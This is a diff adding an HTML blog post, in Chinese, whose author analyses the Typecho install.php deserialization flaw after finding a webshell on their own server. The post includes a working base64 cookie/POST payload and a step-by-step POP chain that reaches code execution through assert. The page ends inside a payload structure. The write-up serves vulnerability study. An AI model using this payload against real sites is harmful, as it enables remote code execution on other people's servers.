@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x00 前言　很久没有在安全方面折腾，突然收到某云的短信，“您的服务器xxx.xxx.xxx.xxx存在网站后门，为防止黑客进一步入侵，请登录进行查看和处理”。当时正在出差，手头没电脑，草草看了一眼没来得及处理，最近得空研究了研究。常在河边走，哪有不湿鞋，网上已经有该漏洞的详解，仅以此文记录对反序列化漏洞研究的一个学习过程。 0x01 漏洞复现使用工具： 1、Firefox浏览器+HackBar">
+<meta name="keywords" content="王三三, 0x21">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Typecho install.php存在的反序列化漏洞">
+<meta property="og:url" content="http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/index.html">
+<meta property="og:site_name" content="王三三">
+<meta property="og:description" content="0x00 前言　很久没有在安全方面折腾，突然收到某云的短信，“您的服务器xxx.xxx.xxx.xxx存在网站后门，为防止黑客进一步入侵，请登录进行查看和处理”。当时正在出差，手头没电脑，草草看了一眼没来得及处理，最近得空研究了研究。常在河边走，哪有不湿鞋，网上已经有该漏洞的详解，仅以此文记录对反序列化漏洞研究的一个学习过程。 0x01 漏洞复现使用工具： 1、Firefox浏览器+HackBar">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.wangsansan.com/usr/uploads/2017/11/3145076725.png">
+<meta property="og:image" content="https://www.wangsansan.com/usr/uploads/2017/11/3601373823.png">
+<meta property="og:image" content="https://www.wangsansan.com/usr/uploads/2017/11/3402341297.png">
+<meta property="og:image" content="https://www.wangsansan.com/usr/uploads/2017/11/3244510342.png">
+<meta property="og:image" content="https://www.wangsansan.com/usr/uploads/2017/11/1033450719.png">
+<meta property="og:image" content="https://www.wangsansan.com/usr/uploads/2017/11/461457831.jpg">
+<meta property="og:image" content="https://www.wangsansan.com/usr/uploads/2017/11/987931809.png">
+<meta property="og:image" content="https://www.wangsansan.com/usr/uploads/2017/11/2833023194.png">
+<meta property="og:updated_time" content="2018-11-23T19:33:42.228Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Typecho install.php存在的反序列化漏洞">
+<meta name="twitter:description" content="0x00 前言　很久没有在安全方面折腾，突然收到某云的短信，“您的服务器xxx.xxx.xxx.xxx存在网站后门，为防止黑客进一步入侵，请登录进行查看和处理”。当时正在出差，手头没电脑，草草看了一眼没来得及处理，最近得空研究了研究。常在河边走，哪有不湿鞋，网上已经有该漏洞的详解，仅以此文记录对反序列化漏洞研究的一个学习过程。 0x01 漏洞复现使用工具： 1、Firefox浏览器+HackBar">
+<meta name="twitter:image" content="https://www.wangsansan.com/usr/uploads/2017/11/3145076725.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/default/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/default/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/default/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Typecho install.php存在的反序列化漏洞</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/08/16/python-虚拟环境virtualenv与django初体验/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&text=Typecho install.php存在的反序列化漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&is_video=false&description=Typecho install.php存在的反序列化漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Typecho install.php存在的反序列化漏洞&body=Check out this article: http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&title=Typecho install.php存在的反序列化漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/11/30/Typecho-install-php存在的反序列化漏洞/&name=Typecho install.php存在的反序列化漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言　</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-漏洞复现"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞探索"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞细节"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-编写EXP"><span class="toc-number">5.</span> <span class="toc-text">0x05 编写EXP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Typecho install.php存在的反序列化漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">王三三</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-11-29T19:20:05.000Z" itemprop="datePublished">2017-11-30</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言　"></a>0x00 前言　</h2><p>很久没有在安全方面折腾，突然收到某云的短信，“您的服务器xxx.xxx.xxx.xxx存在网站后门，为防止黑客进一步入侵，请登录进行查看和处理”。当时正在出差，手头没电脑，草草看了一眼没来得及处理，最近得空研究了研究。常在河边走，哪有不湿鞋，网上已经有该漏洞的详解，仅以此文记录对反序列化漏洞研究的一个学习过程。</p>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p><strong>使用工具：</strong></p>
+<p>1、Firefox浏览器+HackBar插件<br>2、Payload</p>
+<p><strong>下面这段Payload是执行 phpinfo();</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUxMTc5NTIwMTtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</span><br></pre></td></tr></table></figure>
+<p><strong>使用条件：</strong></p>
+<p>1、$_GET[‘finish’] 参数不为空<br>2、Referer 必须是本站<br>__注：Payload可以通过插入Cookie提交，也可以通过POST提交。</p>
+<p><strong>复现：</strong></p>
+<p><img src="https://www.wangsansan.com/usr/uploads/2017/11/3145076725.png" alt="fuxian.png"></p>
+<h2 id="0x02-漏洞探索"><a href="#0x02-漏洞探索" class="headerlink" title="0x02 漏洞探索"></a>0x02 漏洞探索</h2><p>一开始收到短信，我还以为是评论区造成的。先登陆阿里云后台看看是什么问题。</p>
+<p><img src="https://www.wangsansan.com/usr/uploads/2017/11/3601373823.png" alt="aliyun.png"></p>
+<p>本以为只是无伤大雅的小洞，看了之后一惊，Webshell，吓得我赶紧登陆服务器，虽然服务器上没什么值得窃取的。</p>
+<p><img src="https://www.wangsansan.com/usr/uploads/2017/11/3402341297.png" alt="yijuhua.png"></p>
+<p>一句话木马，<strong>expsky</strong>应该是一个昵称，百度一下。</p>
+<p>果然是个昵称，混迹于FreeBuf，最近一篇文章就是关于Typecho反序列化漏洞相关的。本以为是他把我怼了，看了文章之后才发现原来只是漏洞利用检测工具的作者。</p>
+<p><img src="https://www.wangsansan.com/usr/uploads/2017/11/3244510342.png" alt="freebuf.png"></p>
+<p>在此感谢<strong>expsky</strong></p>
+<p>从文章中，得知漏洞存在于install.php文件，附上了漏洞检测工具，不过并没有报告漏洞细节。</p>
+<p>传送门<a href="http://www.freebuf.com/sectool/152889.html" title="Typecho漏洞利用工具首发，半分钟完成渗透测试" target="_blank" rel="noopener">Typecho漏洞利用工具首发，半分钟完成渗透测试</a></p>
+<h2 id="0x03-漏洞细节"><a href="#0x03-漏洞细节" class="headerlink" title="0x03 漏洞细节"></a>0x03 漏洞细节</h2><p>得知漏洞所在文件，接下来就研究研究。</p>
+<p>漏洞存在与229-235行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">    Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line">    $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line">    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">    Typecho_Db::set($db);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>程序要运行到此处需要满足<strong>两个条件</strong></p>
+<p><strong>1、$_GET[‘finish’] 参数不为空</strong></p>
+<p><strong>2、Referer 必须是本站</strong></p>
+<p>这段代码第一行先调用了<strong>Typecho_Cookie::get()</strong>方法获取<strong>$<em>GET[‘\</em>_typecho_config’]</strong>，跳转进去可以看一下</p>
+<p><img src="https://www.wangsansan.com/usr/uploads/2017/11/1033450719.png" alt="cookie_get.png"></p>
+<p>可以看到，如果cookie里不存在<strong>‘__typecho_config’</strong>字段，则从<strong>$_POST</strong>里查找。</p>
+<p>所以在利用的时候，可以直接使用POST提交<strong>‘__typecho_config’</strong></p>
+<p>接着往下看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br></pre></td></tr></table></figure>
+<p>获取到值之后，先base64解码，然后再用<strong>unserialize</strong>反序列化，赋值给<strong>$config</strong>。</p>
+<p>看到这，那我们<strong>input</strong>的内容就是要构造一个<strong>‘__typecho_config’</strong>，来<strong>output</strong>我们想要的东西。</p>
+<p>继续往下寻找可利用的<strong>output</strong>的地方。</p>
+<p>在反序列化之后，取出<strong>$config[‘adapter’]</strong>和<strong>$config[‘prefix’]</strong>实例化了一个<strong>Typecho_Db</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db</span> = new Typecho_Db(<span class="variable">$config</span>[<span class="string">'adapter'</span>], <span class="variable">$config</span>[<span class="string">'prefix'</span>]);</span><br></pre></td></tr></table></figure>
+<p>继续跟进<strong>Typecho_Db</strong></p>
+<p>构造函数在<strong>Db.php</strong>的114行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">    $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化适配器对象</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第120行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br></pre></td></tr></table></figure>
+<p>此处对传入的<strong>$adapterName</strong>进行了字符串拼接。</p>
+<p>如果传入的<strong>$adapterName</strong>,是一个类，那么在将这个类进行字符串拼接的时候就会触发这个类的<strong>__toString()</strong>方法</p>
+<p><strong>注：这里涉及PHP的魔术方法，简单说一下，魔术方法就是在某些情况下会自动去调用的方法，比如很多面向对象编程语言都存在的构造函数、析构函数等等，都可以理解为魔术方法。</strong></p>
+<p><strong>相关方法以及触发条件推荐两个参考链接</strong></p>
+<p><strong><a href="http://php.net/manual/zh/language.oop5.decon.php" title="PHP 魔术方法" target="_blank" rel="noopener">PHP 魔术方法</a></strong></p>
+<p><strong><a href="https://www.cnblogs.com/xiaochaohuashengmi/archive/2011/09/22/2185034.html" title="PHP中的魔术方法总结" target="_blank" rel="noopener">PHP中的魔术方法总结</a></strong></p>
+<p><strong>其实下面这张图已经非常简单明了</strong></p>
+<p><img src="https://www.wangsansan.com/usr/uploads/2017/11/461457831.jpg" alt="moshufangfa.JPG"></p>
+<p><strong>注：图片摘自 [Typecho install.php 后门分析 |王松_Striker - Web安全与前端]</strong></p>
+<p>那我们就来全局搜索一下，看看那些类使用了<strong>__toString()</strong>方法，可以让我们进行利用。</p>
+<p>其中有三个类有使用<strong>__toString()</strong>方法</p>
+<blockquote>
+<p><strong>var/Typecho/Config.php</strong></p>
+<p><strong>var/Typecho/Feed.php</strong></p>
+<p><strong>var/Typecho/Db/Query.php</strong></p>
+</blockquote>
+<p>其中Config.php里没什么好利用的，我们再看一下<strong>Feed.php</strong>和<strong>Query.php</strong></p>
+<p>在Query.php中存在可以触发_call()的魔术方法，全局搜索跟进_call()魔术方法之后没有可利用的点，我们直接查看<strong>Feed.php</strong></p>
+<p><strong>Feed.php</strong>，在290行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br></pre></td></tr></table></figure>
+<p>这里访问了<strong>$item[‘author’]-&gt;screenName</strong></p>
+<p>我们回顾一下上面说的魔术方法，其中<strong>__get()</strong>这个方法在读取不可访问的数据时触发</p>
+<p>而<strong>$item</strong>由<strong>foreach ($this-&gt;_items as $item)</strong>得来，如果我们给<strong>$item[‘author’]</strong>设置一个不可访问的属性，那就会触发该类的<strong>__get()</strong>方法。</p>
+<p><strong>到这里，我们缕一缕思路再继续</strong></p>
+<p>1、从<strong>Cookie</strong>或者<strong>POST</strong>的数据中寻找到<strong>‘__typecho_config’</strong>字段</p>
+<p>2、然后调用<strong>‘__typecho_config’</strong>中的<strong>‘adapter’和’prefix’</strong>实例化一个<strong>Typecho_Db</strong>类</p>
+<p>3、在实例化过程中，采用了字符串拼接访问了<strong>‘adapter’</strong>，当我们设置的<strong>‘adapter’</strong>字段是一个类的话，就会触发这个类的<strong>__toString()</strong>魔术方法</p>
+<p>4、寻找到<strong>Feed</strong>这个类中的<strong>__toString()</strong> 魔术方法，访问了<strong>$item[‘author’]-&gt;screenName</strong></p>
+<p>5、当<strong>$item[‘author’]-&gt;screenName</strong>为一个不可访问的属性时，将会触发该类的<strong>__get()</strong>魔术方法</p>
+<p><strong>好的，至此我们还没有寻找的可利用的output点，我们继续全局搜索一下可利用的 ‘__get()’ 方法</strong> </p>
+<p>在文件<strong>Request.php</strong> 267行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进<strong>get()</strong> 293行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">            $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一段的判断条件，都可以控制<strong>$value</strong>的值</p>
+<p>没有问题，<strong>$value</strong>的值依然在可控范围</p>
+<p>继续跟进<strong>_applyFilter()</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在163-164行，使用了<strong>array_map()</strong>和<strong>call_user_func()</strong></p>
+<p>我们查一下这两个函数分别是什么意思</p>
+<p><img src="https://www.wangsansan.com/usr/uploads/2017/11/987931809.png" alt="array_map.png"></p>
+<p><img src="https://www.wangsansan.com/usr/uploads/2017/11/2833023194.png" alt="call_user_func.png"></p>
+<p>这下就好玩了，这两个函数都是代码执行相关的函数，也就是我们想要的<strong>output</strong>了</p>
+<p><strong>刚刚缕了缕思路，我们再来回顾一边</strong></p>
+<p>1、从<strong>Cookie</strong>或者<strong>POST</strong>的数据中寻找到<strong>‘__typecho_config’</strong>字段</p>
+<p>2、然后调用<strong>‘__typecho_config’</strong>中的<strong>‘adapter’和’prefix’</strong>实例化一个<strong>Typecho_Db</strong>类</p>
+<p>3、在实例化过程中，采用了字符串拼接访问了<strong>‘adapter’</strong>，当我们设置的<strong>‘adapter’</strong>字段是一个类的话，就会触发这个类的<strong>__toString()</strong>魔术方法</p>
+<p>4、寻找到<strong>Feed</strong>这个类中的<strong>__toString()</strong> 魔术方法，访问了<strong>$item[‘author’]-&gt;screenName</strong></p>
+<p>5、当<strong>$item[‘author’]-&gt;screenName</strong>为一个不可访问的属性时，将会触发该类的<strong>__get()</strong>魔术方法</p>
+<p>6、<strong>Typecho_Request</strong>类的魔术方法中，调用了<strong>get()</strong>,该方法内，检测了<strong>_params[$key]</strong>是否存在</p>
+<p>7、将<strong>_params[$key]</strong>的值传入<strong>_applyFilter()</strong>方法，并执行代码</p>
+<p><strong>OK.知道条件之后我们就来构造我们的Payload</strong></p>
+<p>首先看看我们实际提交的结构</p>
+<pre><code>(  // 实例化一个Typecho_Db， 数组必须包含 &apos;adapter&apos;和&apos;prefix&apos;两个键值
+
+/** 
+ * 实例化Typecho_Db时构造函数中进行字符串拼接，
+ * 如果值为对象，则触发该对象的 __toString()魔术方法
+ */
+[adapter] =&gt; Typecho_Feed Object  
+  (
+    /** 
+     * 在Feed的__toString()魔术方法中，
+     * 290行和358行，访问了$item[&apos;author&apos;]-&gt;screenName
+     * 程序要运行到此处$this-&gt;_type必须为 &quot;RSS 2.0&quot;或者&quot;ATOM 1.0&quot;
+     */
+    [_type:Typecho_Feed:private] =&gt; RSS 2.0  
+
+    /** 
+     * 当从不可访问的属性中读取，将会触发该类的__get()魔术方法
+     */
+    [_items:Typecho_Feed:private] =&gt; Array
+      (
+        [0] =&gt; Array
+          (
+            /** 
+             * &apos;category&apos; 用于分支处理，如果不用于回显数据，此字段可以省略
+             *  此处需要构造非空数组，且成员值为对象
+             */
+            [category] =&gt; Array
+              (
+                [0] =&gt; Test Object
+                  (
+                  )
+              )
+
+            /** 
+             *  此处构造满足触发Typecho_Request对象的__get()魔术方法
+             */
+            [author] =&gt; Typecho_Request Object
+              (  // 必须包含两个键值 &apos;_params&apos;和&apos;_filter&apos;
+
+                /** 
+                 * @ 此处为触发的关键部分
+                 * 1、由Feed类中访问screName触发Request的__get()，
+                 *    在Request.php的290行传入$key=&apos;screenName&apos;
+                 * 2、此时get()函数内  $value=&apos;phpinfo()&apos;    // 296-297行
+                 * 3、继续判断了  $value值非数组，且长度大于0  // 307行
+                 * 4、将 $value 传入 _applyFilter()                
+                 * 5、判断 $this-&gt;_filter                    // 161行
+                 * 6、遍历 $this-&gt;_filter                    // 162行
+                 * 7、$value非数组，执行call_user_func($filter, $value)
+                 * 8、最终执行结果为call_user_func(assert, phpinfo())
+                 */
+                [_params:Typecho_Request:private] =&gt; Array
+                  (
+                    [screenName] =&gt; phpinfo()
+                  )
+
+                [_filter:Typecho_Request:private] =&gt; Array
+                  (
+                    [0] =&gt; assert
+                  )
+              )
+          )
+      )
+  )
+
+// 分支处理
+[prefix] =&gt; typecho_
+)
+</code></pre><p>上面部分可能注释太多，看起来比较乱，我贴一个没有注释的</p>
+<pre><code>(
+    [adapter] =&gt; Typecho_Feed Object
+    (
+        [_type:Typecho_Feed:private] =&gt; RSS 2.0
+        [_items:Typecho_Feed:private] =&gt; Array
+        (
+            [0] =&gt; Array
+            (
+                [category] =&gt; Array
+                    (
+                        [0] =&gt; Test Object
+                            (
+                            )
+                    )
+
+                [author] =&gt; Typecho_Request Object
+                (
+                    [_params:Typecho_Request:private] =&gt; Array
+                        (
+                            [screenName] =&gt; phpinfo()
+                        )
+
+                    [_filter:Typecho_Request:private] =&gt; Array
+                        (
+                            [0] =&gt; assert
+                        )
+                )
+            )
+        )
+    )
